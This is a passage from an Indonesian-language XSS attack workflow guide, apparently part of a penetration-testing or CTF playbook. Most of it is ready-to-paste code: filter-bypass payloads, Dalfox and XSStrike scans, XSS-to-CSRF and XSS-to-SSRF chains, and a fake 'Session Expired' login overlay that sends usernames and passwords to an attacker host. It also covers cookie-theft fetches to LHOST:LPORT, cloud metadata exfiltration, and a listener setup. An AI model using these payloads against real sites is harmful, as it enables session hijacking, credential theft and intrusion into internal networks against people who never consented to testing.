        echo "[BLOCK] '$char' → diblok atau di-encode"
    fi
done
```

**OUTPUT BERHASIL ✅ — Identifikasi filter:**

text

```
[PASS]  '<' → muncul di response
[PASS]  '>' → muncul di response
[PASS]  '"' → muncul di response
[BLOCK] 'script' → diblok atau di-encode
[BLOCK] 'alert' → diblok atau di-encode
[PASS]  'onerror' → muncul di response
```

➡️ Filter hanya blok keyword `script` dan `alert`. Bypass:

Bash

```
# Keyword 'alert' diblok → pakai confirm atau prompt
curl -s --get \
  --data-urlencode 'q=<img src=x onerror=confirm(1)>' \
  "http://$TARGET/search" | grep 'confirm'

# Atau obfuscate alert
curl -s --get \
  --data-urlencode 'q=<img src=x onerror=window["al"+"ert"](1)>' \
  "http://$TARGET/search" | grep 'window'

# Atau gunakan template literal
curl -s --get \
  --data-urlencode 'q=<img src=x onerror=alert`1`>' \
  "http://$TARGET/search" | grep 'alert'

# Keyword 'script' diblok tapi event handlers tidak → pakai SVG
curl -s --get \
  --data-urlencode 'q=<svg onload=alert(1)>' \
  "http://$TARGET/search" | grep 'onload'
```

**Jika semua bypass gagal — Google:**

text

```
XSS filter bypass [teknologi yang digunakan, misal: PHP htmlspecialchars bypass]
XSS WAF bypass 2024 cheat sheet portswigger
```

---

## ═══════════════════════════════════════

## FASE 8: AUTOMATION DENGAN TOOLS

## ═══════════════════════════════════════

### Langkah 8.1 — Dalfox (Cepat, untuk Discovery)

Bash

```
# Install jika belum ada
go install github.com/hahwul/dalfox/v2@latest
export PATH="$PATH:$(go env GOPATH)/bin"

# Basic scan
dalfox url "http://$TARGET/search?q=test"

# Dengan cookie
dalfox url "http://$TARGET/search?q=test" \
  --cookie "session=YOUR_COOKIE"

# Dengan custom header
dalfox url "http://$TARGET/search?q=test" \
  --header "Authorization: Bearer TOKEN"

# Blind XSS dengan callback
dalfox url "http://$TARGET/search?q=test" \
  --blind "http://$LHOST:$LPORT/dalfox"

# Scan dari file URL list
dalfox file ~/xss_loot/urls.txt \
  --cookie "session=YOUR_COOKIE" \
  --output ~/xss_loot/dalfox_results.txt
```

**OUTPUT BERHASIL ✅ — Dalfox menemukan XSS:**

text

```
[POC][G][BUILT-IN]VULN /search?q="><script>alert(1)</script>
[POC][R][REFLECTED] param:q
```

➡️ Verifikasi manual di browser. **JANGAN percaya 100% scanner** — selalu konfirmasi manual.

**OUTPUT GAGAL ❌ — Dalfox tidak menemukan:**

text

```
[I] 200 OK - No XSS found
```

➡️ Bukan berarti tidak ada XSS. Dalfox mungkin miss DOM XSS atau Stored XSS. Lanjut manual testing.

### Langkah 8.2 — XSStrike

Bash

```
# Clone dan setup
git clone https://github.com/s0md3v/XSStrike.git /opt/XSStrike
cd /opt/XSStrike
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt

# Scan
python3 xsstrike.py -u "http://$TARGET/search?q=test"

# Dengan POST
python3 xsstrike.py -u "http://$TARGET/search" \
  --data "q=test" \
  -f  # follow redirects

# DOM XSS mode
python3 xsstrike.py -u "http://$TARGET/page" \
  --dom
```

---

## ═══════════════════════════════════════

## FASE 9: CROSS-SERVICE CORRELATION

## ═══════════════════════════════════════

> **XSS sering berinteraksi dengan vulnerability lain. Ketika dapat XSS, pikirkan apa yang bisa dikombinasikan.**

### XSS + CSRF (Paling Umum)

Bash

```
# Jika ada anti-CSRF token, XSS bisa baca token dari DOM
# Payload: ambil CSRF token, lalu lakukan request berbahaya
CSRF_CHAIN_PAYLOAD='<script>
var token = document.querySelector("[name=csrf_token]").value;
fetch("/admin/delete-user/1", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "confirm=yes&csrf_token=" + token
}).then(r => {
  fetch("http://LHOST:LPORT/?done="+r.status);
});
</script>'
```

### XSS + SSRF (Via fetch ke internal)

Bash

```
# XSS bisa jadi bridge untuk scan internal network
SSRF_VIA_XSS='<script>
// Scan internal hosts via victim browser
["169.254.169.254", "192.168.1.1", "10.0.0.1"].forEach(host => {
  fetch("http://" + host + "/latest/meta-data/", {signal: AbortSignal.timeout(2000)})
    .then(r => r.text())
    .then(d => fetch("http://LHOST:LPORT/?host=" + host + "&data=" + encodeURIComponent(d)))
    .catch(() => {});
});
</script>'
```

### XSS + Credential Harvesting

Bash

```
# Phishing login form via XSS
HARVEST_PAYLOAD='<script>
document.body.innerHTML = "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\"><form onsubmit=\"fetch(\'http://LHOST:LPORT/?u=\'+this.username.value+\'&p=\'+this.password.value);return false\"><h2>Session Expired. Please login:</h2><input name=\"username\" placeholder=\"Username\"><input type=\"password\" name=\"password\" placeholder=\"Password\"><button>Login</button></form></div>";
</script>'
```

### Cross-Port Pivot Chart (Ketika XSS Menghasilkan Credentials)

text

```
XSS → Cookie/Credential Stolen
     │
     ├─ ─→ Coba credential ke /admin → <a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>
     ├──→ Coba credential ke SSH (port 22) → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ Jika admin panel terekspos → <a href="/docs/wordpress" class="text-[#00b4d8] hover:underline font-mono font-semibold">17a_wordpress_workflow.md</a> (jika WP)
     ├──→ Coba privilege escalation di web app → <a href="/docs/idor-access-control" class="text-[#00b4d8] hover:underline font-mono font-semibold">27_idor_access_control_workflow.md</a>
     └──→ Jika internal network terlihat → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error/Situasi|Penyebab|Solusi|
|---|---|---|
|Payload muncul di source tapi tidak execute di browser|CSP blocking|Cek console browser, analisis CSP header, ke Fase 6|
|`alert()` tidak muncul meski payload di-reflect|Context salah|Re-analisis context dengan Langkah 1.2|
|`&lt;script&gt;` muncul bukannya `<script>`|HTML encoding aktif|Coba attribute context atau JS context injection|
|Payload hilang sama sekali dari response|Filter/WAF aktif|Jalankan Langkah 7.1 untuk identifikasi filter|
|`document.cookie` kosong|Cookie HttpOnly=true|Beralih ke authenticated action (CSRF via XSS)|
|Stored payload hilang setelah submit|Server-side sanitization|Coba bypass di Fase 7, atau cek API endpoint|
|DOM XSS tidak trigger|hash tidak dikirim ke server|Test manual di browser, hash tidak bisa di-curl|
|Dalfox/XSStrike tidak menemukan|Butuh autentikasi atau kompleks|Manual testing dengan cookie, Burp Suite Repeater|
|Blind XSS tidak dapat callback|Receiver tidak reachable|Cek firewall, pastikan port terbuka di `$LHOST`|
|`Refused to connect` di browser console|CORS/CSP blok outbound|Gunakan `img` tag daripada `fetch` untuk exfil|
|AngularJS `{{}}` tidak di-eval|ng-app tidak aktif di area itu|Periksa scope ng-app di browser DevTools|
|Payload berhasil di Burp tapi gagal di browser|Browser-level filter|Coba browser berbeda, atau encode lebih|
|XSS bekerja tapi session cookie tidak valid|Session terikat IP/UserAgent|Gunakan cookie di browser yang sama, atau gunakan XSS untuk action langsung|
|`Port 8000 already in use`|Port bentrok|`lsof -i :8000` kemudian `kill PID`, atau gunakan port lain|
|`fetch` diblok CSP tapi img tidak|`connect-src` restrictive|Gunakan `new Image().src = "http://attacker/?c="+document.cookie`|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Target Web Application
│
├─ FASE 0: Recon — Identifikasi input points + teknologi
│   ├─ [AngularJS detected] → Test CSTI (Fase 3D)
│   ├─ [CSP ada] → Analisis CSP dulu sebelum testing
│   └─ [API/SPA] → Fokus ke DOM XSS (Fase 3)
│
├─ FASE 1: Reflection Testing
│   ├─ [Reflected] → Identifikasi context (Langkah 1.2)
│   ├─ [Stored]    → Fase 4
│   └─ [DOM only]  → Fase 3
│
├─ FASE 2: Context-Specific Testing
│   ├─ [HTML Body]      → <script>, <img onerror>, <svg onload>
│   ├─ [HTML Attribute] → " onmouseover=" atau ">
│   ├─ [JS String]      → ';alert(1);// atau </script>
│   ├─ [JS Template]    → ${alert(1)}
│   └─ [URL/href]       → javascript:alert(1)
│
├─ FASE 3: DOM XSS Analysis
│   ├─ [Source → Sink path] → Test payload via URL/hash
│   └─ [AngularJS]          → CSTI payload
│
├─ FASE 4: Stored XSS
│   ├─ [Payload tersimpan] → Tunggu admin buka (Blind XSS)
│   └─ [Admin view]        → Cookie theft langsung
│
├─ FASE 5: Impact Assessment
│   ├─ [Cookie accessible]    → Cookie theft → session hijacking
│   ├─ [HttpOnly cookie]      → CSRF via XSS → action as victim
│   └─ [Blind XSS callback]   → Admin cookie → privilege escalation
│
├─ FASE 6: CSP Bypass (jika diperlukan)
│   ├─ [unsafe-inline]        → Langsung inject
│   ├─ [trusted domain]       → JSONP / open redirect
│   └─ [nonce]                → Cari nonce leak
│
└─ FASE 7: Filter Bypass (jika diperlukan)
    ├─ [keyword filtered]     → Obfuscation / alternative keywords
    ├─ [tags filtered]        → Alternative event handlers
    └─ [all blocked]          → Lapor sebagai self-XSS atau informational
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="8000"
mkdir -p ~/xss_loot/{payloads,cookies}

# === RECON ===
curl -sI http://$TARGET/ | grep -iE '(server|csp|set-cookie|x-powered-by)'
curl -s http://$TARGET/ | grep -E '(form|input|ng-app|angular)'

# === REFLECTION TEST ===
curl -s --get --data-urlencode 'q=XSS_TEST_12345' "http://$TARGET/search" | grep -n 'XSS_TEST'

# === HTML BODY ===
curl -s --get --data-urlencode 'q=<script>alert(1)</script>' "http://$TARGET/search" | grep -E '<script>'
curl -s --get --data-urlencode 'q=<img src=x onerror=alert(1)>' "http://$TARGET/search" | grep 'onerror'
curl -s --get --data-urlencode 'q=<svg onload=alert(1)>' "http://$TARGET/search" | grep 'onload'

# === ATTRIBUTE CONTEXT ===
curl -s --get --data-urlencode 'q=" onmouseover="alert(1)' "http://$TARGET/search" | grep 'onmouseover'
curl -s --get --data-urlencode 'q=" autofocus onfocus="alert(1)' "http://$TARGET/search" | grep 'onfocus'

# === JS STRING CONTEXT ===
curl -s --get --data-urlencode "q=';alert(1);//" "http://$TARGET/search" | grep 'alert'
curl -s --get --data-urlencode 'q=</script><script>alert(1)</script>' "http://$TARGET/search"

# === ANGULARJS CSTI ===
curl -s --get --data-urlencode 'q={{7*7}}' "http://$TARGET/search" | grep '>49<'
curl -s --get --data-urlencode 'q={{constructor.constructor("alert(1)")()}}' "http://$TARGET/search"

# === COOKIE THEFT PAYLOAD ===
# (Inject melalui XSS yang sudah terkonfirmasi)
# <script>fetch('http://LHOST:LPORT/?c='+encodeURIComponent(document.cookie))</script>

# === RECEIVER ===
python3 -m http.server $LPORT

# === TOOLS ===
dalfox url "http://$TARGET/search?q=test" --blind "http://$LHOST:$LPORT/dalfox"
python3 /opt/XSStrike/xsstrike.py -u "http://$TARGET/search?q=test"

# === CSP CHECK ===
curl -sI "http://$TARGET/" | grep -i csp
# Paste ke: https://csp-evaluator.withgoogle.com/

# === FILTER IDENTIFICATION ===
for c in '<' '>' '"' "'" 'script' 'alert' 'onerror'; do
  r=$(curl -s --get --data-urlencode "q=TEST${c}TEST" "http://$TARGET/search" | grep -o "TEST${c}TEST")
  [ -n "$r" ] && echo "[PASS] $c" || echo "[BLOCK] $c"
done
```

---

> **➡️ NEXT:** Setelah XSS selesai dan berhasil mendapat session/credentials, lanjut ke **`[🧬 21 — XXE Workflow](/docs/xxe)`** untuk handle XML-based injection, atau ke **`[🔐 27 — IDOR / Access Control Workflow](/docs/idor-access-control)`** jika akses admin panel sudah didapat tapi perlu escalate privileges lebih lanjut.
> 
> **Jika XSS menghasilkan internal network access:** lanjut ke **`[🌐 22 — SSRF Workflow](/docs/ssrf)`** karena XSS + fetch ke internal = SSRF via victim browser.